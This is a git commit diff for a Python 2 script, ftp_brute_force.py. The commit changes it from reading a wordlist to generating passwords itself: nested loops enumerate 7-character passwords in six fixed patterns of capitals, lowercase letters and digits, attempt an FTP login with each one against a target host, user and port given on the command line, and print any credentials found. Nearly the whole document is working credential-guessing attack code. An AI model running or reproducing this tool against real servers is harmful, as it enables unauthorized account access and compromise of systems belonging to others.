84f61dede912d24d7ec9877328165f2ca9c004e4
Equinox <equinox@localhost.localdomain>
2019-10-10 17:47:28 -0400

    moved to 1 file, Password no longer pre-generated

--- ftp_brute_force.py
+++ ftp_brute_force.py
@@ -1,89 +1,76 @@
+#! /usr/bin/python
 import sys
 import argparse
 import datetime
+import ftplib
 from ftplib import FTP
-from word_list_generator import check_file
-from word_list_generator import generate
 
-count = 0
+#This tuple contains the values for the ascii range of each group
+#The top layer has 6 entries that cycles through all 6 permutations of the password format
+#The second layer contains the ascii range for each digit in the password
+#The third layer hold the actual range values for the character type.
+#i.e. capitals letters are in the range 65-90, the +1 to each second val is for looping puposes
+perm = (((65,91), (65,91), (97, 123), (97, 123), (97, 123), (48, 58), (48, 58)),\
+               ((65,91), (65,91), (48, 58), (48, 58), (97, 123), (97, 123), (97, 123)),\
+               ((97, 123), (97, 123), (97, 123), (65,91), (65,91), (48, 58), (48, 58)),\
+               ((97, 123), (97, 123), (97, 123), (48, 58), (48, 58), (65,91), (65,91)),\
+               ((48, 58), (48, 58), (97, 123), (97, 123), (97, 123), (65,91), (65,91)),\
+               ((48, 58), (48, 58), (65,91), (65,91), (97, 123), (97, 123), (97, 123)))
 
-info = '''
-Usage: ./ftp_brute_force.py [options]\n
-Options: -t, --target    <ip>        |   Target\n
-         -u, --user      <username>  |   User\n
-         -p, --port      <port>      |   Port\n
-
-Example: ./ftp_brute_force.py -t 192.168.1.1 -u bob -p 21
-'''
-
-def help():
-    print info
-    sys.exit(0)
-
+#Attempting to login to the ftp server
 def attempt_login(target, port, username, password):
     try:
-        ftp = FTP.connect(target, port)
+        print 'Login Attempt - User: ', username, ' Pass: ',password
+        ftp = FTP()
+        ftp.connect(target, int(port))
         ftp.login(username, password)
         ftp.quit()
         print '[!!] Credentials Discovered'
         print '[!!] Username: ', username
         print '[!!] Password: ', password
-        count += 1
-        return
+        return True
+    #If login is unsuccessful an exception will be thrown
     except:
-        pass
+        return False
 
 
 def brute_force(target, username, port):
-    wordlist = open('BruteForceList.txt', 'r')
-    passwords = wordlist.readlines()
-    for passwd in passwords:
-        passwd = passwords.strip()
-        attempt_login(target, port, username, passwd)
-        if count >0:
-            break
-        
-    
-
-
+    #p changes the permutation of each group
+    for p in range(0,6):
+        #Each consecutive loop cycles through each ascii value at the specified digit
+        for i in range(perm[p][0][0], perm[p][0][1]):
+            for j in range(perm[p][1][0], perm[p][1][1]):
+                for k in range(perm[p][2][0], perm[p][2][1]):
+                    for l in range(perm[p][3][0], perm[p][3][1]):
+                        for m in range(perm[p][4][0], perm[p][4][1]):
+                            for n in range(perm[p][5][0], perm[p][5][1]):
+                                for o in range(perm[p][6][0], perm[p][6][1]):
+                                    #Construct the password based of loop counter values, which will be the specific ascii value for each digit
+                                    passwd = chr(i) + chr(j) + chr(k) + chr(l) + chr(m) + chr(n) + chr(o)
+                                    found = attempt_login(target, port, username, passwd)
+                                    if found==True:
+                                        return 
+            
+#Parsing Command Line arguments        
 parser = argparse.ArgumentParser()
 parser.add_argument("-t", "--target")
 parser.add_argument("-u", "--username")
 parser.add_argument("-p", "--port")
-
 args = parser.parse_args()
-
-if not args.target or not args.username or not args.port:
-    help()
-
 target = args.target
 username = args.username
 port = args.port
 
-
-fileExists = checkFile()
-if not fileExists:
-    print 'Generating wordlist...'
-    start =  datetime.datetime.now()
-    print 'Start time: ', start
-    Generate()
-    end =  datetime.datetime.now()
-    print 'Wordlist complete...'
-    print 'End time: ', end
-
-
+#Start Time
 scriptStart =  datetime.datetime.now()
 print 'Beginning script execution: ', scriptStart
-
+#Running Script
 brute_force(target, username, port)
-
+#Calculating End Time
 scriptEnd =  datetime.datetime.now()
 scriptTime = scriptEnd - scriptStart
-totalTime = scriptStart - start
-
 print 'Script Complete: ', scriptEnd
 print 'Script Runtime: ', scriptTime
-print 'Total Runtime: ', totalTime
 
 sys.exit(0)
 
